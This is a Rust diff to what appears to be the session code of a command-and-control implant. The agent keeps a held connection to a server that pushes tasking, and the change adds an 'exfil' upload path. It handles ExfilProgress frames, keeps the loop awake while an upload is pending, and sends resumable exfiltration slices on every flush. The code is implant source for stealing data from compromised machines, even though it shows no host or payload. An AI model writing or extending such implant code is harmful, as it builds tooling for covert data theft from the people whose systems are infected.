@@ -2,7 +2,7 @@ use prost::Message;
 
 use crate::error::ContactError;
 use crate::session::Session;
-use crate::wire::{ChannelInput, Frame, FrameKind, StagedChunk, TaskRequest};
+use crate::wire::{ChannelInput, ExfilProgress, Frame, FrameKind, StagedChunk, TaskRequest};
 
 // The held live session, shared by the stream transports (architecture.md
 // Sec 8): after the opening handshake exchange the server pushes tasking the
@@ -48,9 +48,10 @@ pub(crate) fn held_handshake(
 
 /// One message's held frames: channel input routes to the live channel it
 /// names, a staged task registers its transfer and pulls inline (the
-/// blocking exchange the held connection permits), tasking is accepted and
-/// flushed the moment it happens. Downstream frames discriminate on kind
-/// first -- the positional tasking parse is for kindless frames alone.
+/// blocking exchange the held connection permits), an exfil seam report
+/// moves its run's confirmed bytes, tasking is accepted and flushed the
+/// moment it happens. Downstream frames discriminate on kind first -- the
+/// positional tasking parse is for kindless frames alone.
 pub(crate) fn serve_held(
     session: &mut Session,
     channel: &mut dyn LiveChannel,
@@ -61,6 +62,12 @@ pub(crate) fn serve_held(
         if frame.kind() == FrameKind::ChannelInput {
             if let Ok(input) = ChannelInput::decode(frame.payload.as_ref()) {
                 session.channels.feed(&input.task_id, input.data, input.eof);
+            }
+            continue;
+        }
+        if frame.kind() == FrameKind::ExfilProgress {
+            if let Ok(progress) = ExfilProgress::decode(frame.payload.as_ref()) {
+                session.exfil_progress(&progress.task_id, &progress.name, progress.held_bytes);
             }
             continue;
         }
@@ -83,8 +90,9 @@ pub(crate) fn serve_held(
 }
 
 /// The parked half of the session loop: channel output is drained and flushed
-/// on every wake, and the park itself blocks while no channel is live
-/// (nothing but the server's push can wake us) or ticks while one is.
+/// on every wake, and the park itself blocks while no channel is live and no
+/// upload run is owed (nothing but the server's push can wake us) or ticks
+/// while either is (a run keeps slicing; a channel could queue output).
 pub(crate) fn serve_loop(
     session: &mut Session,
     channel: &mut dyn LiveChannel,
@@ -93,7 +101,7 @@ pub(crate) fn serve_loop(
     loop {
         session.drain_channels();
         flush(channel, session)?;
-        channel.arm_tick(session.channels.any_live());
+        channel.arm_tick(session.channels.any_live() || session.exfil_pending());
         if let Some(frames) = channel.recv(session)? {
             serve_held(session, channel, &frames, acks)?;
         }
@@ -123,6 +131,22 @@ pub(crate) fn run_staged(
                 continue;
             };
             for frame in frames {
+                // A seam report may interleave with the run (the writer
+                // pushes it beside the staged chunks): route it, never let
+                // it parse as a chunk.
+                if frame.kind() == FrameKind::ExfilProgress {
+                    if let Ok(progress) = ExfilProgress::decode(frame.payload.as_ref()) {
+                        session.exfil_progress(
+                            &progress.task_id,
+                            &progress.name,
+                            progress.held_bytes,
+                        );
+                    }
+                    continue;
+                }
+                if frame.kind() != FrameKind::Unspecified {
+                    continue;
+                }
                 if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
                     session.accept_staged_chunk(&chunk);
                 }
@@ -137,16 +161,22 @@ pub(crate) fn run_staged(
 
 /// Writes whatever the session has queued since the last write, marking it
 /// delivered: a batch that left the socket counts as delivered (the
-/// wire-writing carriers' mark-on-write rule).
+/// wire-writing carriers' mark-on-write rule). The exfil run slices ride
+/// their own message behind the batch -- regenerated from the confirmed
+/// seam every flush, so a message that dies in flight re-sends from the
+/// last seam the server reported (ADR-010's upload arm).
 pub(crate) fn flush(
     channel: &mut dyn LiveChannel,
     session: &mut Session,
 ) -> Result<(), ContactError> {
     let batch = session.outbox.batch();
-    if batch.is_empty() {
-        return Ok(());
+    if !batch.is_empty() {
+        channel.send_batch(session, &batch)?;
+        session.outbox.batch_crossed(batch.len());
     }
-    channel.send_batch(session, &batch)?;
-    session.outbox.batch_crossed(batch.len());
+    let exfil = session.exfil_frames(crate::session::EXFIL_CONTACT_BUDGET);
+    if !exfil.is_empty() {
+        channel.send_batch(session, &exfil)?;
+    }
     Ok(())
 }
